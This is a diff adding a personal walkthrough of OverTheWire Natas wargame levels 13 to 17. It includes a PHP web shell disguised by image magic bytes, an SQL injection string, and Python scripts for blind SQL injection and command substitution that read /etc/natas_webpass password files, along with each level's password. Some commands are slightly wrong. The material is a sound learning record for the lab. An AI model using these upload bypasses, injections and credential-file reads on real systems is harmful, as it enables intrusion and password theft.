@@ -487,4 +487,199 @@ Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 
 # Level 13
 
+## Bypassing checks on image signatures
+
 URL: http://natas13.natas.labs.overthewire.org/
+
+This time is similar to last time with one improvement.
+
+```php
+else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image"; 
+```
+
+So how does `exif_imagetype` works? From [this](https://www.php.net/manual/en/function.exif-imagetype.php) link, it is clear that it reads the first bytes of an image and checks its signature. The magic bytes are `\xff\xd8\xff\xe0`. Thus simply do,
+
+```s
+cat \xff\xd8\xff\xe0 > text
+```
+
+Create `file.php` such that.
+
+```php
+<?
+echo passthru('cat /etc/natas_webpass/natas14')
+?>
+```
+
+Do 
+
+```s
+cat text file.php > file1.php
+```
+
+Fire up inspect element and change the following
+
+```php
+<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
+```
+
+to
+
+```php
+<input type="hidden" name="filename" value="<? print genRandomString(); ?>.php" />
+```
+
+Upload. Open the link. And you have the password.
+
+Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+# Level 14
+
+URL: http://natas14.natas.labs.overthewire.org/
+
+The following SQL query is in place
+
+```php
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+```
+
+A simple SQL injection of the form `" or 1 = 1 #` in the `username` returns always true while commenting out all the other part of the query.
+
+Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+# Level 15
+
+## Blind SQL injection
+
+URL: http://natas15.natas.labs.overthewire.org/
+
+Redo this one later. Allows only usernames and thus you need to construct the password one character at a time.
+
+```py
+import requests
+from requests.auth import HTTPBasicAuth
+
+chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+filtered = ''
+passwd = ''
+
+for char in chars:
+    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
+    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
+    if 'exists' in r.text :
+        filtered = filtered + char
+
+for i in range(0,32):
+    for char in filtered:
+        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
+        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
+        if 'exists' in r.text :
+            passwd = passwd + char
+            print(passwd)
+            break
+
+```
+
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+# Level 16
+
+## Command substitution and boolean injection
+
+URL: http://natas16.natas.labs.overthewire.org/
+
+This level is similar to level 9 and level 10 except for the fact that:
+
+```php
+passthru("grep -i \"$key\" dictionary.txt");
+```
+
+The `\"` before and after the `$key` changes everything. One thing to attack this is command substitution. Consider the following brute force:
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+auth_username = 'natas16'
+auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
+word_list = []
+password_list = [""]
+numeral_list = ["0", "1", "2", "3" ,"4", "5", "6", "7", "8", "9"]
+def brute_force_positions():
+    for i in range(1, 33):
+
+        payload = '$(cut -c' + str(i) +' /etc/natas_webpass/natas17)'
+        response = requests.post('http://natas16.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data = {'needle': payload})
+        response_text = response.text
+        response_text_start_index = response_text.index("<pre>")
+        response_text = response_text[response_text_start_index + 5:]
+        response_text_end_index = response_text.index("</pre>")
+        response_text = response_text[0:response_text_end_index]
+        line_split = response_text.split("\n")
+        captured_line = ""
+        for line in line_split:
+            if(len(line) == 1):
+                captured_line = line
+                word_list.append(line)
+                print(line)
+
+        if(captured_line == ""):
+            word_list.append("numeral")
+            print("numeral")
+
+def modified_queries():
+    payload = '$(cut -c2 /etc/natas_webpass/natas17)'
+    response = requests.post('http://natas16.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data = {'needle': payload})
+    print(response.text)
+
+def create_password_list():
+    global word_list
+    global password_list
+    global numeral_list
+    index = 1
+    for word in word_list:
+        print(index)
+        index = index + 1
+        if(word == "numeral"):
+            new_list = []
+            for password in password_list:
+                for numeral in numeral_list:
+                    new_list.append(password + numeral)
+        else:
+            upper = word.upper()
+            lower = word.lower()
+            new_list = []
+            for password in password_list:
+                new_list.append(password + upper)
+                new_list.append(password + lower)
+        password_list = list(new_list)
+        del(new_list)
+    
+    file_object = open("passwords_natas17.txt", "w")
+    file_object.write(password_list)
+    file_object.close()
+
+
+brute_force_positions()
+create_password_list()
+```
+The substitution occues in `payload = '$(cut -c2 /etc/natas_webpass/natas17)'`. However, brute force is huge. Then we move on to [boolean based injection](https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/) in the way that the query prints something on true and nothing on false. Amazing [walkthrough](https://www.abatchy.com/2016/11/natas-level-16).
+
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+# Level 17
+
+URL: http://natas17.natas.labs.overthewire.org/
+
+## 
+
+### Questions:
+
+#### Can something be done about the PHP code?
+
+No. It is server side.
+
+#### Observe responses of correct and incorrect queries?
+
+No difference. Everything seems same.
